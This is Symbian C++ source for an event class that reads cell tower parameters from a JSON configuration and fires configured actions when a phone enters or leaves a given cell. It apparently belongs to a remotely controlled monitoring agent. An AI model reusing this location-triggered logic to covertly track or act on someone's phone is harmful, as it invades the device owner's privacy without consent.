/*
 ============================================================================
 Name		: EventCellId.cpp
 Author	  : Marco Bellino
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CEventCellId implementation
 ============================================================================
 */

#include "EventCellId.h"
#include "Json.h"

CEventCellId::CEventCellId(TUint32 aTriggerId) :
	CAbstractEvent(EEvent_CellID, aTriggerId), iNetInfoPckg(iNetInfo)
	{
	// No implementation required
	}

CEventCellId::~CEventCellId()
	{
	__FLOG(_L("Destructor"));
	delete iPhone;
	__FLOG(_L("End Destructor"));
	__FLOG_CLOSE;
	} 

CEventCellId* CEventCellId::NewLC(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventCellId* self = new (ELeave) CEventCellId(aTriggerId);
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CEventCellId* CEventCellId::NewL(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventCellId* self = CEventCellId::NewLC(params, aTriggerId);
	CleanupStack::Pop(); // self;
	return self;
	}

void CEventCellId::ConstructL(const TDesC8& params)
	{
	__FLOG_OPEN_ID("HT", "EventCellID.txt");
	__FLOG(_L("-------------"));
	
	BaseConstructL(params);
	iPhone = CPhone::NewL();
	iPhone->SetObserver(this);
	
	RBuf paramsBuf;
		
	TInt err = paramsBuf.Create(2*params.Size());
	if(err == KErrNone)
		{
		paramsBuf.Copy(params);
		}
	else
		{
		//TODO: not enough memory
		}
		
	paramsBuf.CleanupClosePushL();
	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
	CleanupStack::PushL(jsonBuilder);
	jsonBuilder->BuildFromJsonStringL(paramsBuf);
	CJsonObject* rootObject;
	jsonBuilder->GetDocumentObject(rootObject);
	if(rootObject)
		{
		CleanupStack::PushL(rootObject);
		//retrieve cell data
		rootObject->GetIntL(_L("area"),iCellParams.iLAC);
		rootObject->GetIntL(_L("network"),iCellParams.iMNC);
		rootObject->GetIntL(_L("country"),iCellParams.iMCC);
		rootObject->GetIntL(_L("id"),iCellParams.iCell);
		
		//retrieve exit action
		if(rootObject->Find(_L("end")) != KErrNotFound)
			{
			rootObject->GetIntL(_L("end"),iCellParams.iExitAction);
			}
		else
			iCellParams.iExitAction = -1;
			
		//retrieve repeat action
		if(rootObject->Find(_L("repeat")) != KErrNotFound)
			{
			rootObject->GetIntL(_L("repeat"),iCellParams.iRepeatAction);
			rootObject->GetIntL(_L("iter"),iCellParams.iIter);
			rootObject->GetIntL(_L("delay"),iCellParams.iDelay);
			}
		else
			{
			iCellParams.iRepeatAction = -1;
			iCellParams.iIter = 0;
			iCellParams.iDelay = 0;
			}
		
		//retrieve enable flag
		rootObject->GetBoolL(_L("enabled"),iEnabled);
				
		CleanupStack::PopAndDestroy(rootObject);
		}

	CleanupStack::PopAndDestroy(jsonBuilder);
	CleanupStack::PopAndDestroy(&paramsBuf);

	if(iCellParams.iCell != -1)
		iCellParams.iCell = iCellParams.iCell & 0xFFFF;  // added jo'

	}

void CEventCellId::StartEventL()
	{
	iEnabled = ETrue;
	
	// Initialize Properly the iWasConnectedToCell value, 
	// so if we're already connected to the CellID, the Out-Action will be 
	// triggered as soon as we will leave this CellID
	iPhone->GetCellIDSync(iNetInfoPckg);
	iWasConnectedToCell = ConnectedToCellID();
	
	if(iWasConnectedToCell)
	{
		// Triggers the In-Action
		SendActionTriggerToCoreL();
		
	}
	// Receives Notifications Changes of the CellID...
	iPhone->NotifyCellIDChange(iNetInfoPckg);
	}

void CEventCellId::StopEventL()
	{
	iPhone->Cancel();
	iEnabled = EFalse;
	}

// This has been changed in order to permit "*" (-1) value in console configuration build
TBool CEventCellId::ConnectedToCellID()
	{
	__FLOG_1(_L("CellID: %d"), (iNetInfo.iCellId & 0xFFFF));  
	__FLOG_1(_L("LAC: %d"), iNetInfo.iLocationAreaCode);
	__FLOG(_L("MNC - MCC"));
	__FLOG(iNetInfo.iNetworkId);
	__FLOG(iNetInfo.iCountryCode);
	
	if ((iCellParams.iCell != -1) && (iCellParams.iCell != (iNetInfo.iCellId & 0xFFFF)))
		return EFalse;
	if ((iCellParams.iLAC != -1) && (iCellParams.iLAC != iNetInfo.iLocationAreaCode))
		return EFalse;

	TInt mnc = 0;
	TLex lexMnc(iNetInfo.iNetworkId);
	lexMnc.Val(mnc);
	if ((iCellParams.iMNC != -1) && (iCellParams.iMNC != mnc))
		return EFalse;

	TInt mcc = 0;
	TLex lexMcc(iNetInfo.iCountryCode);
	lexMcc.Val(mcc);
	if ((iCellParams.iMCC != -1) && (iCellParams.iMCC != mcc))
		return EFalse;

	return ETrue; 
	}

void CEventCellId::HandlePhoneEventL(TPhoneFunctions event)
	{
	__FLOG_1(_L("HandlePhoneEventL: %d"), event);
	if (event != ENotifyCellIDChange)
		return;

	if (ConnectedToCellID())
		{
		__FLOG(_L("Connected"));
		// Before trigger the event perform an additional check, just in case.
		if (!iWasConnectedToCell)
			{
			iWasConnectedToCell = ETrue;
			// Triggers the In-Action
			SendActionTriggerToCoreL();
			}
		}
	else
		{
		__FLOG(_L("NOT Connected"));
		if (iWasConnectedToCell)
			{
			iWasConnectedToCell = EFalse;
			// Triggers the Out-Action
			if (iCellParams.iExitAction != -1)
				{
				SendActionTriggerToCoreL(iCellParams.iExitAction);
				}
			}
		}
	iPhone->NotifyCellIDChange(iNetInfoPckg);	
	}

/*
 EventCellId

 L'EventCellId, definito nel file di configurazione dal relativo EventId, triggera l'azione ad esso associata quando il device si connette, o disconnette, ad una determinata BTS.

 L'evento e' in grado di triggerare due azioni:

 1. In-Action: quando il device si connette alla BTS.
 2. Out-Action: quando il device si disconnette dall BTS. 

 Parametri

 L'evento riceve cinque parametri di configurazione all'interno della propria EventStruct:

 uExitAction
 E' un UINT ed assume il numero dell'azione da eseguire quando il device si disconnette dalla BTS (e' inizializzato a 0xffffffff nel caso in cui non ci sia alcuna out-action definita). 
 uMobileCountryCode
 E' un UINT ed indica il Mobile Country Code. 
 uMobileNetworkCode
 E' un UINT ed indica il Mobile Network Code. 
 uLocationAreaCode
 E' un UINT ed indica il Location Area Code. 
 uCellId
 E' un UINT ed indica il Cell Id. 
 */

